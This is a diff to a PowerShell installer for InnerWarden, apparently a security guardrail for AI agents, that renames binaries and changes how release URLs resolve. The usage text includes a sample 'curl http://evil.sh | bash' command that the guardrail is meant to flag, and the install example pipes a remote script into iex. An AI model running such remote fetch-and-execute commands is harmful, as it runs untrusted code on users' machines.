@@ -1,28 +1,31 @@
 <#
 .SYNOPSIS
-  Install InnerWarden on Windows: the AI-agent guardrail (default), or the full
-  host tier with -Full.
+  Install InnerWarden on Windows: Community Edition (default), or Active Defence
+  host telemetry with -Full.
 
 .DESCRIPTION
-  Default (no -Full): downloads the signed iw-guard.exe for this machine's
+  Default (no -Full): downloads the signed innerwarden.exe for this machine's
   architecture, verifies its SHA-256, installs it to %LOCALAPPDATA%\Programs\
-  InnerWarden, and adds that dir to the user PATH. No admin required.
+  InnerWarden, and adds that dir to the user PATH. It uses the rolling iw-guard
+  Community release by default. No admin required.
 
-  -Full (elevated): downloads the signed InnerWarden trio (sensor + agent + ctl,
-  x86_64), installs to %ProgramFiles%\InnerWarden with state under
+  -Full (elevated): downloads the latest signed InnerWarden Active Defence trio
+  (sensor + agent + ctl, x86_64), installs to %ProgramFiles%\InnerWarden with state under
   %ProgramData%\InnerWarden, writes a Windows monitor-only config (ETW + integrity
   collectors on, responder off / dry-run), and registers two boot-start SYSTEM
   Scheduled Tasks. This is the Mac-parity light tier (spec 085); the Linux kernel
   EDR (eBPF, Execution Gate) is Linux-only and not part of the Windows build.
 
 .PARAMETER Version
-  Release tag (e.g. v0.16.0). Defaults to the latest release.
+  Release tag. With the default Community install, "latest" resolves to the
+  rolling iw-guard tag (or pass guard-v0.16.0 to pin a frozen cut). With -Full,
+  "latest" resolves to the latest Active Defence release (or pass v0.16.0).
 
 .PARAMETER Full
   Install the full sensor+agent+ctl trio + boot-start service (needs Administrator).
 
 .EXAMPLE
-  irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex
+  irm https://raw.githubusercontent.com/InnerWarden/innerwarden-releases/main/install.ps1 | iex
 
 .EXAMPLE
   .\install.ps1 -Full
@@ -37,9 +40,13 @@ $ErrorActionPreference = "Stop"
 $repo = "InnerWarden/innerwarden-releases"
 
 function Get-ReleaseBase {
-  param([string]$Version)
+  param([string]$Version, [switch]$Community)
   if ($Version -eq "latest") {
-    "https://github.com/$repo/releases/latest/download"
+    if ($Community) {
+      "https://github.com/$repo/releases/download/iw-guard"
+    } else {
+      "https://github.com/$repo/releases/latest/download"
+    }
   } else {
     "https://github.com/$repo/releases/download/$Version"
   }
@@ -90,20 +97,26 @@ function Register-InnerWardenTask {
 # ── Guardrail install (default, per-user, no admin) ───────────────────────────
 function Install-Guard {
   $arch = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "aarch64" } else { "x86_64" }
-  $asset = "iw-guard-windows-$arch.exe"
-  $base = Get-ReleaseBase $Version
+  $asset = "innerwarden-windows-$arch.exe"
+  $base = Get-ReleaseBase -Version $Version -Community
+  $release = if ($Version -eq "latest") { "iw-guard (rolling Community)" } else { $Version }
 
-  $tmp = Join-Path ([IO.Path]::GetTempPath()) ("iw-guard-" + [Guid]::NewGuid().ToString("N"))
+  $tmp = Join-Path ([IO.Path]::GetTempPath()) ("innerwarden-community-" + [Guid]::NewGuid().ToString("N"))
   New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-  $exePath = Join-Path $tmp "iw-guard.exe"
+  $exePath = Join-Path $tmp "innerwarden.exe"
   try {
-    Write-Host "Downloading $asset ($Version)..."
+    Write-Host "Downloading $asset ($release)..."
     Invoke-DownloadVerify -Base $base -Asset $asset -OutPath $exePath
 
     $installDir = Join-Path $env:LOCALAPPDATA "Programs\InnerWarden"
     New-Item -ItemType Directory -Force -Path $installDir | Out-Null
+    Copy-Item $exePath (Join-Path $installDir "innerwarden.exe") -Force
+    # Keep both historical and short command paths current. Existing agent hooks
+    # store the absolute executable path, so replacing `iw-guard.exe` avoids
+    # leaving an upgraded user pinned to an obsolete binary.
     Copy-Item $exePath (Join-Path $installDir "iw-guard.exe") -Force
-    Write-Host "Installed to $installDir\iw-guard.exe"
+    Copy-Item $exePath (Join-Path $installDir "iw.exe") -Force
+    Write-Host "Installed to $installDir\innerwarden.exe"
 
     $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
     if (($userPath -split ';') -notcontains $installDir) {
@@ -112,8 +125,10 @@ function Install-Guard {
     }
     Write-Host ""
     Write-Host "Done. Try it:"
-    Write-Host "  iw-guard check `"curl http://evil.sh | bash`""
-    Write-Host "  iw-guard install claude-code"
+    Write-Host "  innerwarden check `"curl http://evil.sh | bash`""
+    Write-Host "  innerwarden setup"
+    Write-Host "  innerwarden agents connect --all --monitor"
+    Write-Host "  innerwarden agents auto-connect --monitor"
   }
   finally {
     Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
@@ -158,7 +173,8 @@ function Install-Full {
   $dataDir = Join-Path $data "data"
   New-Item -ItemType Directory -Force -Path $prog, $data, $logs, $dataDir | Out-Null
 
-  # Download + verify the trio (x86_64 only; aarch64 trio is not yet released).
+  # Download + verify the host trio and the Community runtime it delegates
+  # agent configuration changes to (x86_64 only for the host trio today).
   $tmp = Join-Path ([IO.Path]::GetTempPath()) ("iw-trio-" + [Guid]::NewGuid().ToString("N"))
   New-Item -ItemType Directory -Force -Path $tmp | Out-Null
   try {
@@ -169,6 +185,11 @@ function Install-Full {
       Invoke-DownloadVerify -Base $base -Asset $asset -OutPath $out
       Copy-Item $out (Join-Path $prog "$bin.exe") -Force
     }
+    $guardAsset = "iw-guard-windows-x86_64.exe"
+    Write-Host "Downloading $guardAsset..."
+    $guardOut = Join-Path $tmp "iw-guard.exe"
+    Invoke-DownloadVerify -Base $base -Asset $guardAsset -OutPath $guardOut
+    Copy-Item $guardOut (Join-Path $prog "iw-guard.exe") -Force
   }
   finally {
     Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
